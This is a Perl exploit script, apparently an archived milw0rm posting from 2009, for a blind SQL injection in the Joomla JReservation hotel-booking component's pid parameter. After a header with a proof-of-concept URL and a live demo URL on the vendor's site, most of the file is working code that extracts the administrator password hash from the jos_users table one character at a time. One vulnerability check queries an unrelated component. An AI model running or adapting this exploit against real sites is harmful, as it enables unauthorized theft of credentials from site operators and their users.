#!/usr/bin/perl -w

#---------------------------------------------------------------------------------
#joomla component com_jreservation (pid) Blind SQL Injection Vulnerability
#---------------------------------------------------------------------------------

#Author         : Chip D3 Bi0s
#Group          : LatiHackTeam
#Email          : chipdebios[alt+64]gmail.com
#Date           : 17 September 2009
#Critical Lvl   : Moderate
#Impact	       : Exposure of sensitive information
#Where	       : From Remote
#---------------------------------------------------------------------------

#Affected software description:
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#Application   : JReservation Hotel Booking Component
#version       : 1.5
#Developer     : Can & Will
#License       : GPL            type  : Commercial
#Date Added    : 15 September 2009
#Demo          : http://jforjoomla.com/cd-hotel
#Download      : http://www.jforjoomla.com/Download-document.html?gid=47 
#Description   :

#Joomla 1.5 Jreservation Component for hotel booking system.
#Jreservation is a specially designed component for hotel owners who provides lodging
#facility & online booking for the rooms like deluxe, Air conditioned, Non Air conditioned.
#By using this Joomla 1.5 Jreservation component you can add multiple room types, amenity 
#types like room amenity or property amenity. Amenity are like additional services which the
#hotel owner provides with the room e.g. Telephone, internet connection, cable connection and
#property amenity like swimming pool, gym, etc. With the help of a calender the user or a 
#customer of the hotel can check rooms availability also book room as a provisional booking.

#---------------------------------------------------------------------------


#I.Blind SQL injection (pid)
#Poc/Exploit:
#~~~~~~~~~~~

#http://127.0.0.1/[path]/index.php?option=com_jreservation&task=propertycpanel&pid=X[blind]
#X: Valid pip


#Demo Live:
#~~~~~~~~~
#http://www.jforjoomla.com/cd-hotel/index.php?option=com_jreservation&task=propertycpanel&pid=1+and+1=1
#etc, etc...

#+++++++++++++++++++++++++++++++++++++++
#[!] Produced in South America
#+++++++++++++++++++++++++++++++++++++++


use LWP::UserAgent;
use Benchmark;
my $t1 = new Benchmark;


print "\t\t------------------------------------------------------------\n\n";
print "\t\t                      |  Chip d3 Bi0s |                     \n\n";
print "\t\t JReservation Hotel Booking Component                        \n\n";
print "\t\t Joomla Component com_jreservation (pid) BSQL                \n\n";
print "\t\t-------------------------------------------------------------\n\n";


print "http://localhost/Path       : ";chomp(my $target=<STDIN>);
print " [-] Introduce pid          : ";chomp($z=<STDIN>);
print " [-] Introduce coincidencia : ";chomp($w=<STDIN>);


$column_name="concat(password)";
$table_name="jos_users";


$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

print "----------------Inyectando----------------\n";

#es Vulnerable?
  $host = $target . "/index.php?option=com_jreservation&task=propertycpanel&pid=".$z."+and+1=1";
  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
  if ($content =~ /$regexp/) {

$host = $target . "/index.php?option=com_jlord_rss&task=feed&id=".$z."+and+1=2";
  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
  if ($content =~ /$regexp/) {print " [-] Exploit Fallo :(\n";}

else

{print " [-] Vulnerable :)\n";

for ($x=1;$x<=32;$x++) 
	{

  $host = $target . "/index.php?option=com_jreservation&task=propertycpanel&pid=".$z."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))>57";
  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
  print " [!] ";if($x <= 9 ) {print "0$x";}else{print $x;}#para alininear 0..9 con los 10-32

  if ($content =~ /$regexp/)
  {
  
          for ($c=97;$c<=102;$c++) 

{
 $host = $target . "/index.php?option=com_jreservation&task=propertycpanel&pid=".$z."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c."";
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = $w;


 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print "-Caracter: $char\n"; $c=102;}
 }


  }
else
{

for ($c=48;$c<=57;$c++) 

{
 $host = $target . "/index.php?option=com_jreservation&task=propertycpanel&pid=".$z."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c."";
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = $w;

 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print "-Caracter: $char\n"; $c=57;}
 }


}

	}
print " [+] Password   :"." ".join('', @caracter) . "\n";
my $t2 = new Benchmark;
my $tt = timediff($t2, $t1);
print "El script tomo:",timestr($tt),"\n";

}
}

else

{print " [-] Exploit Fallo :(\n";}

# milw0rm.com [2009-09-17]
